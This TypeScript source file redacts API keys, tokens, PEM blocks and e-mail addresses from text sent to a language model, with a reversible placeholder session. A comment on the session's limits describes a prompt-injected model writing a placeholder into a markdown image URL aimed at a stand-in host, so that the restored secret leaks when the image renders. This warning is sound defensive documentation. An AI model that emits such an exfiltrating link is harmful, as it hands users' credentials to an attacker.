// vendored from code-kit@0.15.0, src/ts/pure/redact.ts — do not hand-edit; re-vendor via tools/sync-kit.sh
// uebernommen aus ghostline/src/core/context.ts (redactText) und settings-assistant/src/core/secrets.ts (redactFields), 2026-10-09
/** Redaction of secrets, in two entry points (plus a reversible session for text): over free
 *  text and over parsed JSON.
 *
 *  - `redactText` blanks keys, tokens, PEM blocks (and, as a separate opt-in rule, e-mail
 *    addresses) in a string and counts the places it replaced, so a preview can say "N places
 *    redacted". Origin: ghostline's `redact`.
 *  - `redactFields` walks a JSON value and replaces every value under a secret-looking NAME with
 *    {@link REDACTED}, reporting the dotted paths. Origin: settings-assistant's `redact`.
 *  - `createRedactionSession` is the reversible variant of `redactText`: numbered placeholders go
 *    out, the originals are put back into the model's answer (see {@link RedactionSession}).
 *
 *  **Redact first, then cut.** When a text is cut into a window before it is redacted, a block
 *  that crosses the window boundary is no longer a pair: ghostline cut the context first and a
 *  PEM key running over the window edge went to the model in clear text. The orphan rules below
 *  catch a lone BEGIN or END half as a second line, but the order is the real protection: run
 *  `redactText` over the whole text, then slice.
 *
 *  Rule sets are exported separately so a consumer picks the set it applies:
 *  {@link SECRET_REDACT_RULES} (keys, tokens, Bearer, PEM) and {@link EMAIL_REDACT_RULE}.
 *  {@link DEFAULT_REDACT_RULES} is the secret set only. */

// ---- text -------------------------------------------------------------------------------

/** Ordered `[pattern, replacement]` pairs. The replacement is inserted literally (no `$1`
 *  expansion). Use the `g` flag: without it only the first match of a rule is replaced. */
export type RedactRules = readonly (readonly [RegExp, string])[];

/** Keys, tokens, Bearer headers and PEM private-key blocks. */
export const SECRET_REDACT_RULES: RedactRules = [
  // The body may not contain another BEGIN: without that, every BEGIN lacking an END scans to the
  // end of the text and a long run of them costs quadratic time.
  [/-----BEGIN [A-Z ]*PRIVATE KEY-----(?:(?!-----BEGIN)[\s\S])*?-----END [A-Z ]*PRIVATE KEY-----/g, "[redacted-private-key]"],
  [/\bBearer\s+[A-Za-z0-9._~+/=-]{16,}/g, "Bearer [redacted-token]"],
  [/\b(?:sk|rk|pk|ghp|gho|github_pat|xoxb|xoxp)[-_][A-Za-z0-9_-]{12,}/g, "[redacted-token]"],
  [/\bAKIA[0-9A-Z]{16}\b/g, "[redacted-token]"],
];

/** E-mail addresses. Not part of the default: whether an address is a secret depends on the
 *  consumer. Apply it as `[...SECRET_REDACT_RULES, EMAIL_REDACT_RULE]`. */
export const EMAIL_REDACT_RULE: readonly [RegExp, string] = [/(?<![A-Z0-9._%+-])[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/gi, "[redacted-email]"];

/** What `redactText` applies when no rules are passed. */
export const DEFAULT_REDACT_RULES: RedactRules = SECRET_REDACT_RULES;

// Always on, after the rules: at the edge of an excerpt either half of a PEM block can be missing.
// Greedy up to the LAST END: with several unpaired ENDs the text between them is the body of a block
// whose BEGIN was cut away. Stopping at the first END (lazy) left that body in clear text and made a
// second run change the result.
const ORPHAN_END = /^[\s\S]*-----END [A-Z ]*PRIVATE KEY-----/;
const ORPHAN_BEGIN = /-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*$/;
const ORPHAN_PLACEHOLDER = "[redacted-private-key]";

/** Applies `rules`, then the built-in orphan rules, replacing every match through `sub`
 *  (`sub(match, replacement)` returns what goes in its place). One implementation for the one-way
 *  and the reversible entry point, so both find exactly the same places. */
function scan(text: string, rules: RedactRules, sub: (match: string, replacement: string) => string): string {
  let out = text;
  for (const [re, rep] of rules) out = out.replace(re, (m) => sub(m, rep));
  out = out.replace(ORPHAN_END, (m) => sub(m, ORPHAN_PLACEHOLDER));
  return out.replace(ORPHAN_BEGIN, (m) => sub(m, ORPHAN_PLACEHOLDER));
}

/** Blanks secrets in `text`. `count` is the number of places replaced (every effective
 *  replacement counts 1). Idempotent: a second run over the result changes nothing and counts 0. */
export function redactText(text: string, rules: RedactRules = DEFAULT_REDACT_RULES): { text: string; count: number } {
  let count = 0;
  const out = scan(text, rules, (_m, rep) => {
    count++;
    return rep;
  });
  return { text: out, count };
}

// ---- reversible redaction ---------------------------------------------------------------

/** One-way `redactText` is wrong where the model's answer is written back into a note: a fixed
 *  placeholder would silently replace the user's key or address there. A session redacts with
 *  NUMBERED placeholders (`[redacted-token-1]`) and puts the originals back into the answer.
 *
 *  Limits:
 *  - **Where the original lands is the model's choice.** `restore` replaces a placeholder wherever
 *    it stands. A prompt-injected model can write it into a link or image URL or an HTML
 *    attribute (`![x](https://evil.example/?d=[redacted-token-1])`), and the restored answer then
 *    carries the secret there; if the consumer renders it, an image loads without any click.
 *    Pass the answer through `neutralizeModelMarkdown` BEFORE `restore` (it removes images and
 *    HTML; a link still needs a click) and never let the restored text reach a renderer or
 *    a network call unreviewed.
 *  - A placeholder-shaped literal in the INPUT (for example a history that was redacted earlier)
 *    cannot be told from an issued one and is restored if the session knows it; the session never
 *    issues such a literal to a different value.
 *  - Custom rules must not match placeholders or each other's output: rules run in sequence over
 *    the previous result, and a rule such as `[A-Za-z0-9-]{20,}` would eat the inside of an
 *    inserted `[redacted-…]`. The default rules do not.
 *  - If the model rephrases a placeholder (`[redacted token 1]`, a translation), it stays
 *  as written. The original is not lost — the session still holds it — but the user sees the
 *  placeholder instead of the value. The format uses only lowercase letters, digits, `[`, `]`
 *  and `-`, so a model can return it verbatim.
 *
 *  Origin: wish of the write-back consumers (Koda, vault-rag Smart Apply, transmute,
 *  slide-deck, vault-crews), Welle 15, 2026-10-09. */
export interface RedactionSession {
  /** Replaces every match with a numbered placeholder per kind (taken from the rule's
   *  `[redacted-<kind>]` replacement; `secret` if it has none). The same original always gets the
   *  same placeholder within the session. The whole match is replaced, so `Bearer abc…` becomes
   *  `[redacted-token-1]` and the `Bearer ` hint goes with it. */
  redact(text: string): string;
  /** Number of distinct values redacted so far. */
  readonly count: number;
  /** Puts the originals back for every known placeholder. Unknown placeholders stay. */
  restore(text: string): string;
  /** For streams: `push` returns what can be released now and holds back a tail that may still
   *  grow into a placeholder (`[redacted-…` across chunk boundaries); `flush` returns the rest at
   *  the end of the stream. The concatenated output equals `restore` over the concatenated input. */
  restorer(): { push(chunk: string): string; flush(): string };
}

const PLACEHOLDER = /\[redacted-[a-z0-9-]+-\d+\]/g;
// A tail that can still become a placeholder: `[`, then a prefix of "redacted-", then kind chars.
const PLACEHOLDER_START = /^\[(?:r(?:e(?:d(?:a(?:c(?:t(?:e(?:d(?:-[a-z0-9-]*)?)?)?)?)?)?)?)?)?$/;
// Floor for the longest tail held back; a session raises it to fit the longest kind its rules issue.
const MIN_HOLD = 96;

export function createRedactionSession(rules: RedactRules = DEFAULT_REDACT_RULES): RedactionSession {
  const kindOf = (rep: string): string => /\[redacted-([a-z0-9-]+)\]/.exec(rep)?.[1] ?? "secret";
  // A longer run than this cannot be a placeholder this session issues: longest kind plus
  // `[redacted-`, `-<number>` and `]`.
  const maxHold = Math.max(MIN_HOLD, ...rules.map(([, rep]) => kindOf(rep).length + 32), "private-key".length + 32);
  // Placeholder-shaped literals seen in any input: never issued to a value, or restore() would
  // put that value into text where it never stood.
  const reserved = new Set<string>();
  const byOriginal = new Map<string, string>();
  const byPlaceholder = new Map<string, string>();
  let counter = 0;

  const restore = (text: string): string => text.replace(PLACEHOLDER, (ph) => byPlaceholder.get(ph) ?? ph);

  const restorer = () => {
    let buf = "";
    return {
      push(chunk: string): string {
        const s = buf + chunk;
        const open = s.lastIndexOf("[");
        const hold = open >= 0 && s.length - open <= maxHold && PLACEHOLDER_START.test(s.slice(open)) ? open : s.length;
        buf = s.slice(hold);
        return restore(s.slice(0, hold));
      },
      flush(): string {
        const rest = buf;
        buf = "";
        return restore(rest);
      },
    };
  };

  return {
    redact(text: string): string {
      for (const lit of text.match(PLACEHOLDER) ?? []) reserved.add(lit);
      return scan(text, rules, (match, rep) => {
        // An orphan span can contain placeholders issued earlier in this very call: store the
        // plaintext, otherwise restore() would hand back a placeholder literal.
        const original = restore(match);
        const known = byOriginal.get(original);
        if (known) return known;
        const kind = kindOf(rep);
        let ph: string;
        do ph = `[redacted-${kind}-${++counter}]`;
        while (reserved.has(ph));
        byOriginal.set(original, ph);
        byPlaceholder.set(ph, original);
        return ph;
      });
    },
    get count() {
      return byOriginal.size;
    },
    restore,
    restorer,
  };
}

// ---- fields -----------------------------------------------------------------------------

export type Json = null | boolean | number | string | Json[] | { [key: string]: Json };

function isJsonObject(v: unknown): v is { [k: string]: Json } {
  return typeof v === "object" && v !== null && !Array.isArray(v);
}

function getAt(root: Json | null, path: readonly string[]): Json | undefined {
  let cur: Json | undefined = root ?? undefined;
  for (const seg of path) {
    if (!isJsonObject(cur) || !Object.prototype.hasOwnProperty.call(cur, seg)) return undefined;
    cur = cur[seg];
  }
  return cur;
}

const NAME_PATTERNS = ["apikey", "api_key", "api-key", "token", "secret", "password", "credential", "cookie", "email"];
// "author" bleibt frei, "authorization"/"authorize" nicht: `auth` zählt, außer vor "or" ohne folgendes "iz" (Review 2026-10-03, authorization-Fall).
const AUTH = /auth(?!or(?!iz))/;
/** Placeholder `redactFields` writes in place of a secret value. */
export const REDACTED = "🔒";

/** Spec § 11: Teilstring im kleingeschriebenen Namen. Allein nie ausreichend — siehe isSecretValue. */
export function isSecretName(name: string): boolean {
  const l = name.toLowerCase();
  return AUTH.test(l) || NAME_PATTERNS.some((p) => l.includes(p));
}

/** Name passt UND Wert ist nicht-leerer Text oder Objekt/Liste (ganzer Teilbaum). */
export function isSecretValue(name: string, value: Json | undefined): boolean {
  if (value === undefined || value === null || !isSecretName(name)) return false;
  if (typeof value === "string") return value.length > 0;
  return typeof value === "object";
}

/** Ein Pfad ist geheim, wenn irgendein Abschnitt auf dem Weg ein geheimer Wert ist. */
export function isSecretPath(root: Json | null, path: readonly string[]): boolean {
  for (let i = 0; i < path.length; i++) {
    const seg = path[i];
    if (seg !== undefined && isSecretValue(seg, getAt(root, path.slice(0, i + 1)))) return true;
  }
  return false;
}

/** Copy of `value` with every secret value replaced by {@link REDACTED}; `redacted` lists the
 *  dotted paths replaced. The input is not mutated. */
export function redactFields(value: Json): { value: Json; redacted: string[] } {
  const redacted: string[] = [];
  const walk = (v: Json, path: string[]): Json => {
    if (Array.isArray(v)) return v.map((x, i) => walk(x, [...path, String(i)]));
    if (!isJsonObject(v)) return v;
    const out: { [k: string]: Json } = {};
    for (const [k, x] of Object.entries(v)) {
      // defineProperty statt Zuweisung: ein geparster Schlüssel "__proto__" bleibt Datum und setzt keinen Prototyp.
      if (isSecretValue(k, x)) { Object.defineProperty(out, k, { value: REDACTED, enumerable: true, writable: true, configurable: true }); redacted.push([...path, k].join(".")); }
      else Object.defineProperty(out, k, { value: walk(x, [...path, k]), enumerable: true, writable: true, configurable: true });
    }
    return out;
  };
  return { value: walk(value, []), redacted };
}
